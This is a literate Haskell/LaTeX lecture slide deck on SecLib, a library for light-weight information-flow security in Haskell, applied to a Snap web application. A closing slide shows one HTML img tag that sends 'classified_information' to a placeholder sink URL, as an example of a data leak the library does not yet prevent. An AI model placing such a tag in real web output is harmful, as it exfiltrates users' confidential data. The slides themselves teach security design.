\documentclass[fleqn,10pt]{beamer}

%-------------------------------------------------------------------------------
% Packages

\usepackage{lecture}

%-------------------------------------------------------------------------------
% Formatting (general)

%include polycode.fmt
%include spacing.fmt

%-------------------------------------------------------------------------------
% Formatting (specific)

% Use a 2-pt wide, UU-red vertical bar for code
%include colorcode.fmt
\barhs
\definecolor{codecolor}{named}{uuxred}
\setlength{\coderulewidth}{2pt}

% \colorhs
% \definecolor{codecolor}{gray}{0.98}
% \definecolor{codecolor}{rgb}{1,1,0.95}

%format f_back = "f_{back}"
%format g_back = "g_{back}"

\newcommand{\executeiffilenewer}[3]{%
\ifnum\pdfstrcmp{\pdffilemoddate{#1}}%
{\pdffilemoddate{#2}}>0%
{\immediate\write18{#3}}\fi%
}
\newcommand{\includesvg}[1]{%
\executeiffilenewer{#1.svg}{#1.pdf}%
{inkscape -z -D --file=#1.svg %
--export-pdf=#1.pdf --export-latex}%
\input{#1.pdf_tex}%
}

%-------------------------------------------------------------------------------

\begin{document}

%-------------------------------------------------------------------------------

\title{A Library for Light-Weight Information-Flow Security in Haskell}
\author{Drago\c s Ioni\c t\v a}
\date{\today}

%-------------------------------------------------------------------------------

% Indicate that this frame is the title frame.
\frontmatter

\frame{ \titlepage }

% The rest are the non-title frames.
\mainmatter

%-------------------------------------------------------------------------------

\section{The |SecLib| library} 
%if mode=code
\begin{code}
{-# LANGUAGE MultiParamTypeClasses  #-}
{-# LANGUAGE FlexibleInstances      #-}
{-# LANGUAGE FlexibleContexts       #-}
{-# LANGUAGE OverloadedStrings      #-}
{-# LANGUAGE ImplicitParams         #-}
{-# LANGUAGE NoMonomorphismRestriction #-}

module Slides where

import SecLib.Sec hiding (unSecType, sec, Sec, MkSec)
import SecLib.SnapSec hiding (writeBS, getRequest, method)
import SecLib.Lattice (A, S, N)
import DB.Common (Connection, SqlValue)
import DB hiding (User, Post, Entity, getAll)
import Routes -- (Slug, AdmCrtPost)
import Data.Convertible
import Data.ByteString hiding (empty)
import Control.Applicative
import Control.Monad (unless)
import Snap.Types hiding (route, method)
import Data.IORef
import Controllers
import Controllers.Common hiding (writeBS, sec, getRequest, getAll, Sec, User, method)
import Text.Blaze.Html5 as Tag 
import Text.Blaze.Html5.Attributes  as Attr hiding (open, method)
-- import Text.Blaze.Html5.Attributes  as Attr hiding (open)
import qualified Routes as Routes

type UID    = Int 
type Cypher = String
type Name   = String

data File s = MkFile FilePath

-- Bodies for some type signatures:

-- newtype SecIO s a = MkSecIO (IO (Sec s a))
plug = undefined
readSecIO   = undefined
runSnapSec  = undefined
writeSecIO  = undefined
deUserAccount = undefined
deUpdMyAccount = undefined
pwdCheck    = undefined

instance Monad (Sec s) where
  return x = sec x

  MkSec a >>= k =
    MkSec (let MkSec b = k a in b)


\end{code}
%endif


\begin{frame}
\frametitle{Adding security levels to pure values}

Securty levels:
\begin{code}
data H  = H
data L  = L
\end{code}
Protecting values:
\begin{code}
newtype Sec s a = MkSec a
\end{code}
Examples:
\begin{itemize}
\item
|MkSec 42 :: Sec L Integer|
\item
|MkSec "password" :: Sec H Integer|
\end{itemize}

Key observation: restrict access to |MkSec|

\end{frame}

\begin{frame}
\frametitle{Wrapping/unwrapping values}

To secure a value:
\begin{code}
sec ::  a ->  Sec s a
sec     a =   MkSec a
\end{code}

To access a secure value, we export the |open| function:
\begin{code}
open ::  Sec s a    ->  s  ->  a
open     (MkSec a)      s  =   s `seq` a
\end{code}
|s /= undefined| must hold

\end{frame}

\begin{frame}
\frametitle{Trusted/untrusted code}

\begin{itemize}
    \item Confidentiality should be enforced for untrusted code
    \item The trusted code contains all security datatypes
    \item Imported modules (from external packages) must be trusted as well
          (e.g. |unsafePerformIO|)
\end{itemize}
\end{frame}

\begin{frame}
\frametitle{Non-interference}

Assuming that a program has |l|-level and |h|-level inputs and outputs,

Security level |l| exhibits non-interference property with respect to |h|
iff running the program using any sequence of inputs of level |l| always 
produces the same result, independent of |h|-level inputs. 

An attacker who can manipulate program inputs at level |l| can not acquire any 
information about data on level |h|.
\end{frame}

\begin{frame}
\frametitle{Non-interference}
Non-interference should not be breached
\begin{itemize}
\item Directly:
\begin{verbatim}
    let publicValue = secretValue in ...
\end{verbatim}

\item Indirectly:
\begin{verbatim}
    if length secretList > 100 
        then publicOperation1
        else publicOperation2
\end{verbatim}

\end{itemize}
\end{frame}

\begin{frame}
\frametitle{Lattice of security levels}
\emph{By default, any two security levels are non-interferent}.

We can define a lattice specifying where non-interference must \emph{not}
be enforced:

\begin{code}
class Less l h where
    less :: l -> h -> ()
\end{code}
\begin{itemize}
\item
    \emph{|h| is not non-interferent with respect to |l|}.
\item
    \emph{Information can flow from |l| to |h|}.
\end{itemize}

E.g. for $\{L, H\}$:
\begin{code}
instance Less  a  a  where less _ _ = () -- reflexivity
instance Less  L  H  where less _ _ = () 
\end{code}

\end{frame}

\begin{frame}
\frametitle{Information flow in the lattice}
Information fom `lower' levels can flow to `higher' ones:
\begin{code}
up  :: Less l h => Sec l a -> Sec h a
up  sec_l@(MkSec a)  =  less sl sh `seq` sec_h
    where   (sec_h)  =  MkSec a 
            sl       =  unSecType sec_l 
            sh       =  unSecType sec_h

unSecType :: Sec s a -> s 
unSecType _ = undefined
\end{code}
\end{frame}

\begin{frame}
\frametitle{Declassification}
Declassification policies must be part of the trusted code:
\begin{code}
type Hatch h l a b = Sec h a -> IO (Maybe (Sec l b))
\end{code}

\begin{code}
hatch :: Less l h => (a -> b) -> Hatch h l a b
hatch f sa = return (Just (return (f (reveal sa))))
    where  reveal :: Sec s a -> a
           reveal (MkSec a) = a
\end{code}

Example policy:
\begin{code}
data Spwd = Spwd { uid :: UID, cypher :: Cypher } 
policy1 = hatch (\(spwd,c) -> cypher spwd == c)
\end{code}
\end{frame}

\begin{frame}
\frametitle{Dynamic hatches}
\begin{code}
ntimes :: Int -> Hatch h l a b -> IO (Hatch h l a b)  
ntimes n f = do     
    ref <- newIORef n
    return $ \sa -> do  
        k <- readIORef ref
        if  k <= 0
            then  do    return Nothing
            else  do    writeIORef ref (k-1)
                        f sa 
\end{code}
\end{frame}

\begin{frame}
\frametitle{Implicit parameters}

Trivial example:

\begin{code}
binOp :: (Num a) => a -> a -> a -> a
binOp a b c = (a + b) + c
\end{code}
Can be parametrized with:
\begin{code}
binOp' :: (a -> a -> a) -> a -> a -> a -> a
binOp' op a b c = op (op a b) c
\end{code}

\end{frame}

\begin{frame}
\frametitle{Implicit parameters}

We can also parametrize it using \texttt{ImplicitParams}:
\begin{code}
binOp'' :: (?op::a -> a -> a) => a -> a -> a -> a
binOp'' a b c = ?op (?op a b) c
\end{code}
When calling |binOp''|, we first need to set an |?op| value:
\begin{code}
testBinOp'' :: (Num a) => a -> a -> a -> a
testBinOp'' = let ?op = (+) in binOp''
\end{code}

Why do we need this? To parametrize our program with
escape hatches for declassification.

\end{frame}

\begin{frame}
\frametitle{Computations with side-effects}
Introducing a restricted |IO| monad, |SecIO|:

\begin{code}
newtype SecIO s a = MkSecIO (IO (Sec s a))
\end{code}
Example function that operates in the |SecIO| monad:
\begin{code}
readSecIO :: Less l h => File l -> SecIO h String
\end{code}

\end{frame}

\begin{frame}
\frametitle{|plug| Combinator}
Executing high-level security operations in a low security context:
\begin{code}
plug :: Less l h => SecIO h a -> SecIO l (Sec h a)
\end{code}

\end{frame}

\section{Security for web applications}

\begin{frame}
\frametitle{Snap web server}

\begin{itemize}
\item
    |Snap a| type, instance of |Monad|, |Applicative|, |Alternative|
\item Provides access to a |Request| value
\item The web application builds a corresponding |Response| value.
\end{itemize}

\end{frame}

\begin{frame}
\frametitle{Usage example}

Alternative operator behaviour:

\begin{code}
route1  ::  Snap ()
route1  =   empty
\end{code}

\begin{code}
route2  ::  Snap ()
route2  =   writeBS "Hello World"
\end{code}

|writeBS| appends a |ByteString| to the response body

|route1 <||> route2| and |route2 <||> route1| both
append |"Hello World"|.

\end{frame}

\begin{frame}
\frametitle{|Snap| Combinators}

We can define combinators such as:
\begin{code}
method :: Method -> Snap a -> Snap a
method m action = do
    req <- getRequest
    unless (rqMethod req == m) empty
    action
\end{code}

And combine them:
\begin{code}
test = method POST route1 <|> method GET route2
\end{code}

Other combinators discriminate on the \texttt{URL} of the request.

\end{frame}

\begin{frame}
\frametitle{Experimental |SecLib| web application}

Security levels lattice:

\begin{verbatim}
 S (Superusers - administrators)
 |
 N (Normal users)
 | 
 A (Anonymous visitors)
\end{verbatim}

\end{frame}

\begin{frame}
\frametitle{Datatypes}
\begin{code}
data Post = Post  {  idPost        :: Integer
                  ,  postSlug      :: Slug
                  ,  postTitle     :: String
                  ,  postContents  :: String
                  ,  draft         :: Bool
                  ,  idUserAuthor  :: Integer }
data User = User  {  idUser        :: Integer
                  ,  userLevel     :: UserLevel
                  ,  email         :: String
                  ,  pwdHash       :: UserPassword }
\end{code}
\end{frame}

\begin{frame}
\frametitle{Persistent storage}

Abstracted through:
\begin{code}
class Entity a s where
    getAll  ::  Connection -> SnapSec s [a]
    getOne  ::  (Convertible k SqlValue) 
            =>  k -> Connection -> SnapSec s (Maybe a)
    insert  ::  a -> Connection -> SnapSec s Integer
    delete  ::  a -> Connection -> SnapSec s Integer
    update  ::  a -> Connection -> SnapSec s Integer
\end{code}
\begin{code}
instance Entity  User  S  where ...
instance Entity  Post  N  where ...
instance Entity  Post  A  where ...
\end{code}
Note that |Post| objects can be both |N| and |A| values.

\end{frame}

\begin{frame}
\frametitle{Persistent storage}

\begin{itemize}
    \item Currently achieved through \texttt{HDBC-sqlite3}
    \item Very simple code
    \item Could be replaced by libraries that offer more type safety.
\end{itemize}

\end{frame}

\begin{frame}
\frametitle{Trusted/Untrusted code}

Overview of trusted/untrusted code from the example:

{\small
\begin{verbatim}
src/
  Controllers/      Untrusted
    Common.hs, Frontend.hs, Login.hs, Posts.hs, Users.hs
  DB/               Trusted
    Common.hs, Post.hs, User.hs
  SecLib/           Trusted
    Lattice.hs, Sec.hs, SecLibTypes.hs, SnapSec.hs, 
    SecLib.hs ...
  Forms.hs          Untrusted
  Main.hs           Trusted
  Policies.hs       Trusted
  ...
news.db
lcookie.key
\end{verbatim}
}

\end{frame}

\begin{frame}
\frametitle{Securing the |Snap| monad---the |SnapSec| monad}

Running a |SnapSec| computation
\begin{code}
runSnapSec :: SnapSec s a -> Snap (Sec s a)
\end{code}

|SnapSec| implements the |Alternative| interface choice operator 
and expectedly behaves like |Snap|;

Declassification function type:
\begin{code}
type Hatch' h l a b = Sec h a -> SnapSec l b
\end{code}

\end{frame}


\begin{frame}
\frametitle{Declassification policies}

Own account information

\begin{code}
deUserAccount :: Hatch' S N (Maybe User) (Maybe User)
\end{code}

\begin{itemize}
    \item Checks if the |User| value corresponds to the currently logged in user
    \item If so, it allows the downgrade
    \item Why is this flawed?
\end{itemize}
\end{frame}

\begin{frame}
\frametitle{Declassification policies}
{\small
\begin{code}
deUpdMyAccount  ::  (User -> Connection -> SnapSec S Integer)
                ->  (User -> Connection -> SnapSec N (Maybe Integer))
\end{code}
}

\begin{itemize}
    \item It is supposed to allow updating of the current user account
    \item Not actually of type |Hatch|
    \item Why is this flawed?
\end{itemize}

\end{frame}

\begin{frame}
\frametitle{Declassification policies}
\begin{code} 
pwdCheck :: Hatch' S A (Maybe (Login, User)) (Maybe ByteString)
\end{code}
\begin{itemize}
\item Downgrades user information to a lower security level only if the 
login data is valid
\item 
Encrypts user information with a 32-byte |S|-level key
\item
This data is also stored in a 
cookie\footnote{A string sent within a |Response|, stored by the client} 
and sent to the server on each request
\end{itemize}

\end{frame}

\begin{frame}
\frametitle{Demo}

\includegraphics[width=250px]{interface.png}

\end{frame}

\section{Conclusion}

\begin{frame}
\frametitle{Other security problems}

Unsolved problems:

\begin{itemize}
\item
    |Response| values can contain scripts, which can be executed by the browser
    \begin{itemize}
        \item How could this be solved?
    \end{itemize}
\item
Leaks can be introduced by allowing certain HTML attribute values:
{\scriptsize
\begin{verbatim}
<img src="http://example.com/sink.php?send=classified_information" />
\end{verbatim}
}
\begin{itemize}
    \item How could this be solved?
\end{itemize}

\end{itemize}

\end{frame}

\begin{frame}
\frametitle{Other security problems}

Information can flow from lower levels to upper ones

\begin{itemize}
\item
    It is possible to create `fake' login credentials and
    use |up| to make them high-security.
    Attackers who alter the source code can 
    gain access to confidential information in this way.
\item
    Because of this, my opinion is that untrusted code must be 
    non-malicious.
\end{itemize}

\end{frame}

\begin{frame}
\frametitle{Error messages}

Assuming we want to use as few type annotations as possible:

\begin{itemize}
    \item The current \texttt{ImplicitParams} extension for GHC reports 
          type errors `wrongly'
          \begin{itemize}
                \item Errors are reported where the implicit parameter
                      was defined
          \end{itemize}
    \item Haskell's monomorphism restriction can kick in and produce
          confusing error messages
    \item Functions we assume as polymorphic in their security level may 
          be instantiated by accident
          \begin{itemize}
                \item Errors are reported in an unrelated program point
                \item With a large number of modules, they can be difficult
                      to find.
          \end{itemize}
\end{itemize}

\end{frame}

\begin{frame}
\frametitle{On the plus side, |SecLib|...}

\begin{itemize}
    \item Can be used in |Haskell|, which has a wide range of libraries
    \item Causes little overhead 
    \item Declassification policies provide an overview of application 
          weak spots in general.
\end{itemize}

\end{frame}

\begin{frame}
\frametitle{Conclusion}
\begin{itemize}
\item Thank you for participating!
\item Questions?
\end{itemize}

\end{frame}

\end{document}
